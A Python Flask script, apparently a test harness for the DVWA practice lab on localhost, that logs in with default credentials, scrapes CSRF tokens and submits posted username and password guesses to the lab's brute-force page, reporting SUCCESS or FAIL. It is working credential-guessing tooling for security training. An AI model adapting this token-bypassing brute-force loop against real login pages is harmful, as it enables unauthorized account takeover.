from flask import Flask, request
import subprocess
import re

app = Flask(__name__)

@app.route('/test', methods=['POST'])
def test_brute_force():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    print(f"Testing brute force: {username}:{password}")
    
    try:
        subprocess.run([
            'curl', '-sS', '-c', 'cookies.txt', '-o', 'login_page.html',
            'http://localhost:4280/login.php'
        ], capture_output=True, check=True)
        
        with open('login_page.html', 'r') as f:
            html = f.read()
        token_match = re.search(r"name='user_token' value='([^']*)'", html)
        if not token_match:
            return "FAIL", 200
        login_token = token_match.group(1)
        
        subprocess.run([
            'curl', '-L', '-sS', '-b', 'cookies.txt', '-c', 'cookies.txt',
            '-d', f'username=admin&password=password&Login=Login&user_token={login_token}',
            '-o', 'login_result.html',
            'http://localhost:4280/login.php'
        ], capture_output=True, check=True)
        
        subprocess.run([
            'curl', '-sS', '-b', 'cookies.txt', '-c', 'cookies.txt', '-o', 'brute_page.html',
            'http://localhost:4280/vulnerabilities/brute/'
        ], capture_output=True, check=True)
        
        with open('brute_page.html', 'r') as f:
            html = f.read()
        token_match = re.search(r"name='user_token' value='([^']*)'", html)
        if not token_match:
            return "FAIL", 200
        brute_token = token_match.group(1)
        
        subprocess.run([
            'curl', '-sS', '-b', 'cookies.txt', '-c', 'cookies.txt',
            '-d', f'username={username}&password={password}&Login=Login&user_token={brute_token}',
            '-o', 'brute_result.html',
            'http://localhost:4280/vulnerabilities/brute/'
        ], capture_output=True, check=True)
        
        with open('brute_result.html', 'r') as f:
            result = f.read()
        
        if 'Welcome to the password protected area' in result:
            print("✓ SUCCESS (brute force)")
            return "SUCCESS", 200
        else:
            print("✗ FAIL (brute force)")
            return "FAIL", 200
            
    except Exception as e:
        print(f"ERROR: {e}")
        return "FAIL", 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=9999)